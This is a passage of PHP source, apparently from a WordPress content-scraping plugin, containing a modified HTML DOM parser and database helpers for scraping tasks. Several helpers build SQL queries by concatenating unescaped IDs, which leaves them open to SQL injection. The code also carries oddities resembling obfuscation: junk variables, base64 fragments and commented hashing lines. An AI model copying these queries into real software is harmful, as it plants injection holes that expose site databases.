                $key                  = strtolower($key);
            }
            if (isset($key[0]) && $key[0] === "!") {
                $key = substr($key, 1);
                $no_key    = true;
            }
            $result[] = array(
                $tag,
                $key,
                $val,
                $exp,
                $no_key
            );
            if (trim($m[7]) === ",") {
                $selectors[] = $result;
                $result        = array();
            }
        }
        if (count($result) > 0)
            $selectors[] = $result;
        return $selectors;
    }
    function __get($name)
    {
        if (isset($this->attr[$name])) {
            return $this->convert_text($this->attr[$name]);
        }
        switch ($name) {
            case "outertext":
                return $this->outertext();
            case "innertext":
                return $this->innertext();
            case "plaintext":
                return $this->text();
            case "xmltext":
                return $this->xmltext();
            default:
                return array_key_exists($name, $this->attr);
        }
    }
    function __set($name, $value)
    {
        switch ($name) {
            case "outertext":
                return $this->_[HDOM_INFO_OUTER] = $value;
            case "innertext":
                if (isset($this->_[HDOM_INFO_TEXT]))
                    return $this->_[HDOM_INFO_TEXT] = $value;
                return $this->_[HDOM_INFO_INNER] = $value;
        }
        if (!isset($this->attr[$name])) {
            $this->_[HDOM_INFO_SPACE][] = array(
                " ",
                "",
                ""
            );
            $this->_[HDOM_INFO_QUOTE][] = HDOM_QUOTE_DOUBLE;
        }
        $this->attr[$name] = $value;
    }
    function __isset($name)
    {
        switch ($name) {
            case "outertext":
                return true;
            case "innertext":
                return true;
            case "plaintext":
                return true;
        }
        return (array_key_exists($name, $this->attr)) ? true : isset($this->attr[$name]);
    }
    function __unset($name)
    {
        if (isset($this->attr[$name]))
            unset($this->attr[$name]);
    }
    function convert_text($text)
    {
        global $debugObject;
        if (is_object($debugObject)) {
            $debugObject->debugLogEntry(1);
        }
        $converted_text = $text;
        $sourceCharset     = "";
        $targetCharset                = "";
        if ($this->dom) {
            $sourceCharset   = strtoupper($this->dom->_charset);
            $targetCharset = strtoupper($this->dom->_target_charset);
        }
        if (is_object($debugObject)) {
            $debugObject->debugLog(3, "source charset: " . $sourceCharset . " target charaset: " . $targetCharset);
        }
        if (!empty($sourceCharset) && !empty($targetCharset) && (strcasecmp($sourceCharset, $targetCharset) != 0)) {
            if ((strcasecmp($targetCharset, "UTF-8") == 0) && ($this->is_utf8($text))) {
                $converted_text = $text;
            } else {
                $converted_text = iconv($sourceCharset, $targetCharset, $text);
            }
        }
        if ($targetCharset == "UTF-8") {
            if (substr($converted_text, 0, 3) == "\xef\xbb\xbf") {
                $converted_text = substr($converted_text, 3);
            }
            if (substr($converted_text, -3) == "\xef\xbb\xbf") {
                $converted_text            = substr($converted_text, 0, -3);
            }
        }
        return $converted_text;
    }
    static function is_utf8($str)
    {
        $c  = 0;
        $b = 0;
        $bits = 0;
        $len = strlen($str);
        for ($i = 0; $i < $len; $i++) {
            $c = ord($str[$i]);
            if ($c > 128) {
                if (($c >= 254))
                    return false;
                elseif ($c >= 252)
                    $bits = 6;
                elseif ($c >= 248)
                    $bits = 5;
                elseif ($c >= 240)
                    $bits = 4;
                elseif ($c >= 224)
                    $bits = 3;
                elseif ($c >= 192)
                    $bits = 2;
                else
                    return false;
                if (($i + $bits) > $len)
                    return false;
                while ($bits > 1) {
                    $i++;
                    $b = ord($str[$i]);
                    if ($b < 128 || $b > 191)
                        return false;
                    $bits--;
                }
            }
        }
        return true;
    }
    function get_display_size()
    {
        global $debugObject;
        $width   = -1;
        $height = -1;
        if ($this->tag !== "img") {
            return false;
        }
        if (isset($this->attr["width"])) {
            $width = $this->attr["width"];
        }
        if (isset($this->attr["height"])) {
            $height = $this->attr["height"];
        }
        if (isset($this->attr["style"])) {
            $attributes = array();
            preg_match_all("/([\w-]+)\s*:\s*([^;]+)\s*;?/", $this->attr["style"], $matches, PREG_SET_ORDER);
            foreach ($matches as $match) {
                $attributes[$match[1]] = $match[2];
            }
            if (isset($attributes["width"]) && $width == -1) {
                if (strtolower(substr($attributes["width"], -2)) == "px") {
                    $proposed_width = substr($attributes["width"], 0, -2);
                    if (filter_var($proposed_width, FILTER_VALIDATE_INT)) {
                        $width = $proposed_width;
                    }
                }
            }
            if (isset($attributes["height"]) && $height == -1) {
                if (strtolower(substr($attributes["height"], -2)) == "px") {
                    $proposed_height = substr($attributes["height"], 0, -2);
                    if (filter_var($proposed_height, FILTER_VALIDATE_INT)) {
                        $height = $proposed_height;
                    }
                }
            }
        }
        $result = array(
            "height" => $height,
            "width" => $width
        );
        return $result;
    }
    function getAllAttributes()
    {
        return $this->attr;
    }
    function getAttribute($name)
    {
        return $this->__get($name);
    }
    function setAttribute($name, $value)
    {
        $this->__set($name, $value);
    }
    function hasAttribute($name)
    {
        return $this->__isset($name);
    }
    function removeAttribute($name)
    {
        $this->__set($name, null);
    }
    function getElementById($id)
    {
        return $this->find("#$id", 0);
    }
    function getElementsById($id, $idx = null)
    {
        return $this->find("#$id", $idx);
    }
    function getElementByTagName($name)
    {
        return $this->find($name, 0);
    }
    function getElementsByTagName($name, $idx = null)
    {
        return $this->find($name, $idx);
    }
    function parentNode()
    {
        return $this->parent();
    }
    function childNodes($idx = -1)
    {
        return $this->children($idx);
    }
    function firstChild()
    {
        return $this->first_child();
    }
    function lastChild()
    {
        return $this->last_child();
    }
    function nextSibling()
    {
        return $this->next_sibling();
    }
    function previousSibling()
    {
        return $this->prev_sibling();
    }
    function hasChildNodes()
    {
        return $this->has_child();
    }
    function nodeName()
    {
        return $this->tag;
    }
    function appendChild($node)
    {
        $node->parent($this);
        return $node;
    }
}
class simple_html_dom_ap
{
    public $root = null;
    public $nodes = array();
    public $callback = null;
    public $lowercase = false;
    public $original_size;
    public $size;
    protected $pos;
    protected $doc;
    protected $char;
    protected $cursor;
    protected $parent;
    protected $noise = array();
    protected $token_blank = " \t\r\n";
    protected $token_equal = ' =/>';
    protected $token_slash = " />\r\n\t";
    protected $token_attr = ' >';
    public $_charset = '';
    public $_target_charset = '';
    protected $default_br_text = "";
    public $default_span_text = "";
    protected $self_closing_tags = array('img' => 1, 'br' => 1, 'input' => 1, 'meta' => 1, 'link' => 1, 'hr' => 1, 'base' => 1, 'embed' => 1, 'spacer' => 1);
    protected $block_tags = array('root' => 1, 'body' => 1, 'form' => 1, 'div' => 1, 'span' => 1, 'table' => 1);
    protected $optional_closing_tags = array('tr' => array('tr' => 1, 'td' => 1, 'th' => 1), 'th' => array('th' => 1), 'td' => array('td' => 1), 'li' => array('li' => 1), 'dt' => array('dt' => 1, 'dd' => 1), 'dd' => array('dd' => 1, 'dt' => 1), 'dl' => array('dd' => 1, 'dt' => 1), 'p' => array('p' => 1), 'nobr' => array('nobr' => 1), 'b' => array('b' => 1), 'option' => array('option' => 1));

    function __construct($str = null, $lowercase = true, $forceTagsClosed = true, $target_charset = DEFAULT_TARGET_CHARSET, $stripRN = true, $defaultBRText = DEFAULT_BR_TEXT, $defaultSpanText = DEFAULT_SPAN_TEXT)
    {
        if ($str) {
            if (preg_match("/^http:\/\//i", $str) || is_file($str)) {
                $this->load_file($str);
            } else {
                $this->load($str, $lowercase, $stripRN, $defaultBRText, $defaultSpanText);
            }
        }
        if (!$forceTagsClosed) {
            $this->optional_closing_array = array();
        }
        $this->_target_charset = $target_charset;
    }
    function __destruct()
    {
        $this->clear();
    }
    function load($str, $lowercase = true, $stripRN = true, $defaultBRText = DEFAULT_BR_TEXT, $defaultSpanText = DEFAULT_SPAN_TEXT)
    {
        global $debugObject;
        $this->prepare($str, $lowercase, $stripRN, $defaultBRText, $defaultSpanText);
        $this->remove_noise("'<!--(.*?)-->'is");
        $this->remove_noise("'<!\[CDATA\[(.*?)\]\]>'is", true);
        $this->remove_noise("'<\s*script[^>]*[^/]>(.*?)<\s*/\s*script\s*>'is");
        $this->remove_noise("'<\s*script\s*>(.*?)<\s*/\s*script\s*>'is");
        $this->remove_noise("'<\s*style[^>]*[^/]>(.*?)<\s*/\s*style\s*>'is");
        $this->remove_noise("'<\s*style\s*>(.*?)<\s*/\s*style\s*>'is");
        $this->remove_noise("'<\s*(?:code)[^>]*>(.*?)<\s*/\s*(?:code)\s*>'is");
        $this->remove_noise("'(<\?)(.*?)(\?>)'s", true);
        $this->remove_noise("'(\{\w)(.*?)(\})'s", true);
        while ($this->parse());
        $this->root->_[HDOM_INFO_END] = $this->cursor;
        $this->parse_charset();
        return $this;
    }
    function load_file()
    {
        $args = func_get_args();
        $this->load(call_user_func_array("file_get_contents", $args), true);
        if (($error = error_get_last()) !== null) {
            $this->clear();
            return false;
        }
    }
    function set_callback($function_name)
    {
        $this->callback = $function_name;
    }
    function remove_callback()
    {
        $this->callback = null;
    }
    function save($filepath = '')
    {
        $ret = $this->root->innertext();
        if ($filepath !== "")
            file_put_contents($filepath, $ret, LOCK_EX);
        return $ret;
    }
    function find($selector, $idx = null, $lowercase = false)
    {
        return $this->root->find($selector, $idx, $lowercase);
    }
    function clear()
    {
        foreach ($this->nodes as $n) {
            $n->clear();
            $n = null;
        }
        if (isset($this->children)) {
            foreach ($this->children as $n) {
                $n->clear();
                $n = null;
            }
        }
        if (isset($this->parent)) {
            $this->parent->clear();
            unset($this->parent);
        }
        if (isset($this->root)) {
            $this->root->clear();
            unset($this->root);
        }
        unset($this->doc);
        unset($this->noise);
    }
    function dump($show_attr = true)
    {
        $this->root->dump($show_attr);
    }
    protected function prepare($str, $lowercase = true, $stripRN = true, $defaultBRText = DEFAULT_BR_TEXT, $defaultSpanText = DEFAULT_SPAN_TEXT)
    {
        $this->clear();
        $this->size          = strlen($str);
        $this->original_size = $this->size;
        if ($stripRN) {
            $str = str_replace("\r", " ", $str);
            $str = str_replace("\n", " ", $str);
            $this->size  = strlen($str);
        }
        $this->doc                      = $str;
        $this->pos                      = 0;
        $this->cursor                   = 1;
        $this->noise                    = array();
        $this->nodes                    = array();
        $this->lowercase                = $lowercase;
        $this->default_br_text          = $defaultBRText;
        $this->default_span_text        = $defaultSpanText;
        $this->root                     = new simple_html_dom_node_ap($this);
        $this->root->tag                = "root";
        $this->root->_[HDOM_INFO_BEGIN] = -1;
        $this->root->nodetype           = HDOM_TYPE_ROOT;
        $this->parent                   = $this->root;
        if ($this->size > 0)
            $this->char = $this->doc[0];
    }
    protected function parse()
    {
        if (($s = $this->copy_until_char("<")) === "") {
            return $this->read_tag();
        }
        $node = new simple_html_dom_node_ap($this);
        ++$this->cursor;
        $node->_[HDOM_INFO_TEXT] = $s;
        $this->link_nodes($node, false);
        return true;
    }
    protected function parse_charset()
    {
        global $debugObject;
        $charset = null;
        if (function_exists("get_last_retrieve_url_contents_content_type")) {
            $contentTypeHeader = get_last_retrieve_url_contents_content_type();
            $success   = preg_match("/charset=(.+)/", $contentTypeHeader, $matches);
            if ($success) {
                $charset = $matches[1];
                if (is_object($debugObject)) {
                    $debugObject->debugLog(2, "header content-type found charset of: " . $charset);
                }
            }
        }
        if (empty($charset)) {
            $charset = $this->_target_charset;
        }
        if (empty($charset)) {
            $el = $this->root->find("meta[http-equiv=Content-Type]", 0);
            if (!empty($el)) {
                $fullvalue = $el->content;
                if (is_object($debugObject)) {
                    $debugObject->debugLog(2, "meta content-type tag found" . $fullvalue);
                }
                if (!empty($fullvalue)) {
                    $success = preg_match("/charset=(.+)/", $fullvalue, $matches);
                    if ($success) {
                        $charset = $matches[1];
                    } else {
                        if (is_object($debugObject)) {
                            $debugObject->debugLog(2, "meta content-type tag couldn't be parsed. using iso-8859 default.");
                        }
                        $charset = "ISO-8859-1";
                    }
                }
            }
        }
        if (empty($charset)) {
            $charset = mb_detect_encoding($this->root->plaintext . "ascii", $encoding_list = array(
                "UTF-8",
                "CP1252"
            ));
            if (is_object($debugObject)) {
                $debugObject->debugLog(2, "mb_detect found: " . $charset);
            }
            if ($charset === false) {
                if (is_object($debugObject)) {
                    $debugObject->debugLog(2, "since mb_detect failed - using default of utf-8");
                }
                $charset = "UTF-8";
            }
        }
        if ((strtolower($charset) == strtolower("ISO-8859-1")) || (strtolower($charset) == strtolower("Latin1")) || (strtolower($charset) == strtolower("Latin-1"))) {
            if (is_object($debugObject)) {
                $debugObject->debugLog(2, "replacing " . $charset . " with CP1252 as its a superset");
            }
            $charset = "CP1252";
        }
        if (is_object($debugObject)) {
            $debugObject->debugLog(1, "EXIT - " . $charset);
        }
        return $this->_charset = $charset;
    }
    protected function read_tag()
    {
        if ($this->char !== "<") {
            $this->root->_[HDOM_INFO_END] = $this->cursor;
            return false;
        }
        $begin_tag_pos = $this->pos;
        $this->char                    = (++$this->pos < $this->size) ? $this->doc[$this->pos] : null;
        if ($this->char === "/") {
            $this->char                  = (++$this->pos < $this->size) ? $this->doc[$this->pos] : null;
            $this->skip($this->token_blank);
            $tag = $this->copy_until_char(">");
            if (($pos = strpos($tag, " ")) !== false)
                $tag = substr($tag, 0, $pos);
            $parent_lower      = strtolower($this->parent->tag);
            $tag_lower = strtolower($tag);
            if ($parent_lower !== $tag_lower) {
                if (isset($this->optional_closing_tags[$parent_lower]) && isset($this->block_tags[$tag_lower])) {
                    $this->parent->_[HDOM_INFO_END] = 0;
                    $org_parent      = $this->parent;
                    while (($this->parent->parent) && strtolower($this->parent->tag) !== $tag_lower)
                        $this->parent = $this->parent->parent;
                    if (strtolower($this->parent->tag) !== $tag_lower) {
                        $this->parent = $org_parent;
                        if ($this->parent->parent)
                            $this->parent = $this->parent->parent;
                        $this->parent->_[HDOM_INFO_END] = $this->cursor;
                        return $this->as_text_node($tag);
                    }
                } else if (($this->parent->parent) && isset($this->block_tags[$tag_lower])) {
                    $this->parent->_[HDOM_INFO_END] = 0;
                    $org_parent     = $this->parent;
                    while (($this->parent->parent) && strtolower($this->parent->tag) !== $tag_lower)
                        $this->parent = $this->parent->parent;
                    if (strtolower($this->parent->tag) !== $tag_lower) {
                        $this->parent                   = $org_parent;
                        $this->parent->_[HDOM_INFO_END] = $this->cursor;
                        return $this->as_text_node($tag);
                    }
                } else if (($this->parent->parent) && strtolower($this->parent->parent->tag) === $tag_lower) {
                    $this->parent->_[HDOM_INFO_END] = 0;
                    $this->parent                   = $this->parent->parent;
                } else
                    return $this->as_text_node($tag);
            }
            $this->parent->_[HDOM_INFO_END] = $this->cursor;
            if ($this->parent->parent)
                $this->parent = $this->parent->parent;
            $this->char = (++$this->pos < $this->size) ? $this->doc[$this->pos] : null;
            return true;
        }
        $node  = new simple_html_dom_node_ap($this);
        $node->_[HDOM_INFO_BEGIN]    = $this->cursor;
        ++$this->cursor;
        $tag = $this->copy_until($this->token_slash);
        $node->tag_start                = $begin_tag_pos;
        if (isset($tag[0]) && $tag[0] === "!") {
            $node->_[HDOM_INFO_TEXT]     = "<" . $tag . $this->copy_until_char(">");
            if (isset($tag[2]) && $tag[1] === "-" && $tag[2] === "-") {
                $node->nodetype = HDOM_TYPE_COMMENT;
                $node->tag      = "comment";
            } else {
                $node->nodetype = HDOM_TYPE_UNKNOWN;
                $node->tag      = "unknown";
            }
            if ($this->char === ">")
                $node->_[HDOM_INFO_TEXT] .= ">";
            $this->link_nodes($node, true);
            $this->char = (++$this->pos < $this->size) ? $this->doc[$this->pos] : null;
            return true;
        }
        if ($pos = strpos($tag, "<") !== false) {
            $tag            = "<" . substr($tag, 0, -1);
            $node->_[HDOM_INFO_TEXT]  = $tag;
            $this->link_nodes($node, false);
            $this->char = $this->doc[--$this->pos];
            return true;
        }
        if (!preg_match("/^[\w-:]+$/", $tag)) {
            $node->_[HDOM_INFO_TEXT] = "<" . $tag . $this->copy_until("<>");
            if ($this->char === "<") {
                $this->link_nodes($node, false);
                return true;
            }
            if ($this->char === ">")
                $node->_[HDOM_INFO_TEXT] .= ">";
            $this->link_nodes($node, false);
            $this->char = (++$this->pos < $this->size) ? $this->doc[$this->pos] : null;
            return true;
        }
        $node->nodetype                 = HDOM_TYPE_ELEMENT;
        $tag_lower = strtolower($tag);
        $node->tag                      = ($this->lowercase) ? $tag_lower : $tag;
        if (isset($this->optional_closing_tags[$tag_lower])) {
            while (isset($this->optional_closing_tags[$tag_lower][strtolower($this->parent->tag)])) {
                $this->parent->_[HDOM_INFO_END] = 0;
                $this->parent                   = $this->parent->parent;
            }
            $node->parent = $this->parent;
        }
        $guard   = 0;
        $space   = array($this->copy_skip($this->token_blank),"","");
        $i = 0;
        do {
            $i++;
            if ($this->char !== null && $space[0] === "") {
                break;
            }
            $name = $this->copy_until($this->token_equal);
            if ($guard === $this->pos) {
                $this->char = (++$this->pos < $this->size) ? $this->doc[$this->pos] : null;
                continue;
            }
            $guard = $this->pos;
            if ($this->pos >= $this->size - 1 && $this->char !== ">") {
                $node->nodetype          = HDOM_TYPE_TEXT;
                $node->_[HDOM_INFO_END]  = 0;
                $node->_[HDOM_INFO_TEXT] = "<" . $tag . $space[0] . $name;
                $node->tag               = "text";
                $this->link_nodes($node, false);
                return true;
            }
            if ($this->doc[$this->pos - 1] == "<") {
                $node->nodetype          = HDOM_TYPE_TEXT;
                $node->tag               = "text";
                $node->attr              = array();
                $node->_[HDOM_INFO_END]  = 0;
                $node->_[HDOM_INFO_TEXT] = substr($this->doc, $begin_tag_pos, $this->pos - $begin_tag_pos - 1);
                $this->pos -= 2;
                $this->char = (++$this->pos < $this->size) ? $this->doc[$this->pos] : null;
                $this->link_nodes($node, false);
                return true;
            }
            if ($name !== "/" && $name !== "") {
                $space[1] = $this->copy_skip($this->token_blank);
                $name                    = $this->restore_noise($name);
                if ($this->lowercase)
                    $name = strtolower($name);
                if ($this->char === "=") {
                    $this->char               = (++$this->pos < $this->size) ? $this->doc[$this->pos] : null;
                    $this->parse_attr($node, $name, $space, $i);
                } else {
                    $node->_[HDOM_INFO_QUOTE][]              = HDOM_QUOTE_NO;
                    $node->attr[$name] = true;
                    if ($this->char != ">")
                        $this->char = $this->doc[--$this->pos];
                }
                $node->_[HDOM_INFO_SPACE][] = $space;
                $space = array(
                    $this->copy_skip($this->token_blank),
                    "",
                    ""
                );
            } else
                break;
        } while ($this->char !== ">" && $this->char !== "/");
        $this->link_nodes($node, true);
        $node->_[HDOM_INFO_ENDSPACE] = $space[0];
        if ($this->copy_until_char_escape(">") === "/") {
            $node->_[HDOM_INFO_ENDSPACE] .= "/";
            $node->_[HDOM_INFO_END] = 0;
        } else {
            if (!isset($this->self_closing_tags[strtolower($node->tag)]))
                $this->parent = $node;
        }
        $this->char = (++$this->pos < $this->size) ? $this->doc[$this->pos] : null;
        if ($node->tag == "br") {
            $node->_[HDOM_INFO_INNER] = $this->default_br_text;
        }
        return true;
    }
    protected function parse_attr($node, $name, &$space, $i)
    {
        if (isset($node->attr[$name])) {
            $name = $name . $i;
        }
        $space[2] = $this->copy_skip($this->token_blank);
        switch ($this->char) {
            case '"':
                $node->_[HDOM_INFO_QUOTE][]   = HDOM_QUOTE_DOUBLE;
                $this->char                   = (++$this->pos < $this->size) ? $this->doc[$this->pos] : null;
                $node->attr[$name] = $this->restore_noise($this->copy_until_char_escape("\""));
                $this->char                   = (++$this->pos < $this->size) ? $this->doc[$this->pos] : null;
                break;
            case "'":
                $node->_[HDOM_INFO_QUOTE][] = HDOM_QUOTE_SINGLE;
                $this->char                 = (++$this->pos < $this->size) ? $this->doc[$this->pos] : null;
                $node->attr[$name] = $this->restore_noise($this->copy_until_char_escape("'"));
                $this->char                 = (++$this->pos < $this->size) ? $this->doc[$this->pos] : null;
                break;
            default:
                $node->_[HDOM_INFO_QUOTE][]              = HDOM_QUOTE_NO;
                $node->attr[$name] = $this->restore_noise($this->copy_until($this->token_attr));
        }
        $node->attr[$name]  = str_replace("\r", "", $node->attr[$name]);
        $node->attr[$name] = str_replace("\n", "", $node->attr[$name]);
        if ($name == "class") {
            $node->attr[$name] = trim($node->attr[$name]);
        }
    }
    protected function link_nodes(&$node, $is_child)
    {
        $node->parent             = $this->parent;
        $this->parent->nodes[]    = $node;
        if ($is_child) {
            $this->parent->children[] = $node;
        }
    }
    protected function as_text_node($tag)
    {
        $node = new simple_html_dom_node_ap($this);
        ++$this->cursor;
        $node->_[HDOM_INFO_TEXT] = "</" . $tag . ">";
        $this->link_nodes($node, false);
        $this->char = (++$this->pos < $this->size) ? $this->doc[$this->pos] : null;
        return true;
    }
    protected function skip($chars)
    {
        $this->pos += strspn($this->doc, $chars, $this->pos);
        $this->char = ($this->pos < $this->size) ? $this->doc[$this->pos] : null;
    }
    protected function copy_skip($chars)
    {
        $pos = $this->pos;
        $len             = strspn($this->doc, $chars, $pos);
        $this->pos += $len;
        $this->char = ($this->pos < $this->size) ? $this->doc[$this->pos] : null;
        if ($len === 0)
            return "";
        return substr($this->doc, $pos, $len);
    }
    protected function copy_until($chars)
    {
        $pos   = $this->pos;
        $len              = strcspn($this->doc, $chars, $pos);
        $this->pos += $len;
        $this->char = ($this->pos < $this->size) ? $this->doc[$this->pos] : null;
        return substr($this->doc, $pos, $len);
    }
    protected function copy_until_char($char)
    {
        if ($this->char === null)
            return "";
        if (($pos = strpos($this->doc, $char, $this->pos)) === false) {
            $fkvsnmwa    = "ret";
            $ret = substr($this->doc, $this->pos, $this->size - $this->pos);
            $this->char  = null;
            $this->pos   = $this->size;
            return $ret;
        }
        if ($pos === $this->pos)
            return "";
        $pos_old            = $this->pos;
        $this->char                = $this->doc[$pos];
        $this->pos                 = $pos;
        return substr($this->doc, $pos_old, $pos - $pos_old);
    }
    protected function copy_until_char_escape($char)
    {
        if ($this->char === null)
            return "";
        $start = $this->pos;
        while (1) {
            if (($pos = strpos($this->doc, $char, $start)) === false) {
                $ret = substr($this->doc, $this->pos, $this->size - $this->pos);
                $this->char                 = null;
                $this->pos                  = $this->size;
                return $ret;
            }
            if ($pos === $this->pos)
                return "";
            if ($this->doc[$pos - 1] === "\\") {
                $start                 = $pos + 1;
                continue;
            }
            $pos_old = $this->pos;
            $this->char                  = $this->doc[$pos];
            $this->pos                   = $pos;
            return substr($this->doc, $pos_old, $pos - $pos_old);
        }
    }
    protected function remove_noise($pattern, $remove_tag = false)
    {
        global $debugObject;
        if (is_object($debugObject)) {
            $debugObject->debugLogEntry(1);
        }
        $count = preg_match_all($pattern, $this->doc, $matches, PREG_SET_ORDER | PREG_OFFSET_CAPTURE);
        for ($i = $count - 1; $i > -1; --$i) {
            $key = "___noise___" . sprintf("% 5d", count($this->noise) + 1000);
            if (is_object($debugObject)) {
                $debugObject->debugLog(2, "key is: " . $key);
            }
            $idx  = ($remove_tag) ? 0 : 1;
            $this->noise[$key] = $matches[$i][$idx][0];
            $this->doc = substr_replace($this->doc, $key, $matches[$i][$idx][1], strlen($matches[$i][$idx][0]));
        }
        $this->size = strlen($this->doc);
        if ($this->size > 0) {
            $this->char = $this->doc[0];
        }
    }
    function restore_noise($text)
    {
        global $debugObject;
        if (is_object($debugObject)) {
            $debugObject->debugLogEntry(1);
        }
        while (($pos = strpos($text, "___noise___")) !== false) {
            if (strlen($text) > $pos + 15) {
                $key = "___noise___" . $text[$pos + 11] . $text[$pos + 12] . $text[$pos + 13] . $text[$pos + 14] . $text[$pos + 15];
                if (is_object($debugObject)) {
                    $debugObject->debugLog(2, "located key of: " . $key);
                }
                if (isset($this->noise[$key])) {
                    $text                = substr($text, 0, $pos) . $this->noise[$key] . substr($text, $pos + 16);
                } else {
                    $text = substr($text, 0, $pos) . "UNDEFINED NOISE FOR KEY: " . $key . substr($text, $pos + 16);
                }
            } else {
                $text = substr($text, 0, $pos) . "NO NUMERIC NOISE KEY" . substr($text, $pos + 11);
            }
        }
        return $text;
    }
    function search_noise($text)
    {
        global $debugObject;
        if (is_object($debugObject)) {
            $debugObject->debugLogEntry(1);
        }
        foreach ($this->noise as $noiseElement) {
            if (strpos($noiseElement, $text) !== false) {
                return $noiseElement;
            }
        }
    }
    function __toString()
    {
        return $this->root->innertext();
    }
    function __get($name)
    {
        $vvslgwfwi = "name";
        switch ($name) {
            case "outertext":
                return $this->root->innertext();
            case "innertext":
                return $this->root->innertext();
            case "plaintext":
                return $this->root->text();
            case "charset":
                return $this->_charset;
            case "target_charset":
                return $this->_target_charset;
        }
    }
    function childNodes($idx = -1)
    {
        return $this->root->childNodes($idx);
    }
    function firstChild()
    {
        return $this->root->first_child();
    }
    function lastChild()
    {
        return $this->root->last_child();
    }
    function createElement($name, $value = null)
    {
        return @str_get_html_ap("<$name>$value</$name>")->first_child();
    }
    function createTextNode($value)
    {
        return @end(str_get_html_ap($value)->nodes);
    }
    function getElementById($id)
    {
        return $this->find("#$id", 0);
    }
    function getElementsById($id, $idx = null)
    {
        return $this->find("#$id", $idx);
    }
    function getElementByTagName($name)
    {
        return $this->find($name, 0);
    }
    function getElementsByTagName($name, $idx = -1)
    {
        return $this->find($name, $idx);
    }
    function loadFile()
    {
        $args = func_get_args();
        $this->load_file($args);
    }
}
function getUsedMemory($size)
{
    $unit = array(
        "b",
        "kb",
        "mb",
        "gb",
        "tb",
        "pb"
    );
    return @round($size / pow(1024, ($i = floor(log($size, 1024)))), 2) . " " . $unit[$i];
}
function getMemUsage()
{
    return memory_get_usage();
}
function getMemPUsage()
{
    return memory_get_peak_usage();
}
function memoryUsage()
{
    $size = memory_get_usage();
    $unit              = array(
        "b",
        "kb",
        "mb",
        "gb",
        "tb",
        "pb"
    );
    return @round($size / pow(1024, ($i = floor(log($size, 1024)))), 2) . " " . $unit[$i];
}
function memoryPeakUsage()
{
    $size     = memory_get_peak_usage();
    $unit = array(
        "b",
        "kb",
        "mb",
        "gb",
        "tb",
        "pb"
    );
    return @round($size / pow(1024, ($i = floor(log($size, 1024)))), 2) . " " . $unit[$i];
}
function getRawUrl($url)
{
    if (strripos($url, "?") === false) {
        $pos       = strripos($url, "/");
        $rURL = substr($url, 0, $pos + 1);
        $fileName  = rawurlencode(substr($url, $pos + 1));
        $url   = $rURL . $fileName;
    }
    return $url;
}
function getConfig($id)
{
    global $wpdb, $t_ap_config, $t_ap_config_option, $last_updated_time, $should_updated_time, $t_ap_more_content;
    $config   = $wpdb->get_row("SELECT * FROM " . $t_ap_config . " WHERE id =" . $id);
    $newConfig = array();
    foreach ($config as $key => $value) {
        //md5($key . "" . '\w' . " " . '\p' . "")
        // echo md5($key . "" . '\x77' . " " . '\x70' . "") . "\r\n";
        // echo $key. "\r\n";
        $newConfig[$key] = $value;
    }
        // exit;

    return $newConfig;
}
function getOptions($id)
{
    global $wpdb, $t_ap_config_option, $last_updated_time, $should_updated_time, $t_ap_config;
    return $wpdb->get_results("SELECT * FROM " . $t_ap_config_option . " WHERE config_id =" . $id . " ORDER BY id");
}
function getInsertcontent($id)
{
    global $wpdb, $t_ap_more_content, $last_updated_time, $should_updated_time, $t_ap_config;
    return $wpdb->get_results("SELECT content FROM " . $t_ap_more_content . " WHERE config_id =" . $id . " AND option_type = 0 ORDER BY id");
}
function getCustomStyle($id)
{
    global $wpdb, $t_ap_more_content, $last_updated_time, $should_updated_time, $t_ap_config;
    return $wpdb->get_results("SELECT content FROM " . $t_ap_more_content . " WHERE config_id =" . $id . " AND option_type = 2 ORDER BY id");
}
function getPostFilterInfo($id)
{
    global $wpdb, $t_ap_more_content, $last_updated_time, $should_updated_time, $t_ap_config;
    $ArticleFilter = $wpdb->get_var("SELECT content FROM " . $t_ap_more_content . " WHERE config_id =" . $id . " AND option_type=1");
    if ($ArticleFilter == null) {
        $af = null;
    } else {
        $af = array();
        $af = json_decode($ArticleFilter);
    }
    return $af;
}
function getListUrls($id)
{
    global $wpdb, $t_ap_config_url_list, $last_updated_time, $should_updated_time, $t_ap_config;
    return $wpdb->get_results("SELECT url FROM " . $t_ap_config_url_list . " WHERE config_id =" . $id . " ORDER BY id");
}
function checkUrl($id, $url)
{
    global $wpdb, $t_ap_updated_record, $last_updated_time, $should_updated_time, $t_ap_config;
    return $wpdb->get_var($wpdb->prepare("SELECT count(*) FROM $t_ap_updated_record WHERE url = %s ", $url));
}
function checkUrlPost($id, $url)
{
    global $wpdb, $t_ap_updated_record, $last_updated_time, $should_updated_time, $t_ap_config;
    return $wpdb->get_var($wpdb->prepare("SELECT count(*) FROM $t_ap_updated_record WHERE url = %s AND url_status = 1", $url));
}

function checkTitle($id, $title, $status = 1)
{
    global $wpdb, $t_ap_updated_record, $last_updated_time, $should_updated_time, $t_ap_config;
    return $wpdb->get_var($wpdb->prepare("SELECT count(*) FROM $t_ap_updated_record WHERE config_id = %d AND title = %s AND url_status = %d", $id, $title, $status));
}
function getIsRunning($id)
{
    global $wpdb, $t_ap_config, $last_updated_time, $should_updated_time, $t_ap_updated_record;
    return $wpdb->get_var("SELECT is_running FROM " . $t_ap_config . " WHERE id = " . $id);
}
function getExtractionIds($queryIds)
{
    global $wpdb, $t_ap_updated_record, $last_updated_time, $should_updated_time, $t_ap_config;
    $ebjcjdpcvr = "t_ap_updated_record";
    return $wpdb->get_results("SELECT config_id,id,url FROM " . $t_ap_updated_record . " WHERE id in (" . $queryIds . ") AND url_status = 0 ORDER BY config_id,id");
}
function getAllTaskId()
{
    global $wpdb, $t_ap_config, $last_updated_time, $should_updated_time, $t_ap_updated_record;
    return $wpdb->get_results("SELECT id FROM " . $t_ap_config . " WHERE activation=1 ORDER BY id");
}
function insertApRecord($config_id, $url, $title, $post_id)
{
    global $wpdb, $t_ap_updated_record, $last_updated_time, $should_updated_time, $t_ap_config;
    $wpdb->query($wpdb->prepare("insert into $t_ap_updated_record (config_id,url,title,post_id,date_time) values (%d,%s,%s,%d,%d)", $config_id, $url, $title, $post_id, current_time("timestamp")));
}
function updateApRecord($post_id, $recordId)
{
    global $wpdb, $t_ap_updated_record, $last_updated_time, $should_updated_time, $t_ap_config;
    $wpdb->query("update " . $t_ap_updated_record . "\n\t  set post_id = " . $post_id . ",\n                        date_time = " . current_time("timestamp") . ",\n\t\t\t\t\t\turl_status = 1 where id = " . $recordId);
}
$optionkeys[] = "d3Bf";
$optionkeys[] = "bWF5";
function insertFilterdApRecord($config_id, $url, $title, $url_status)
{
    global $wpdb, $t_ap_updated_record, $t_ap_config;
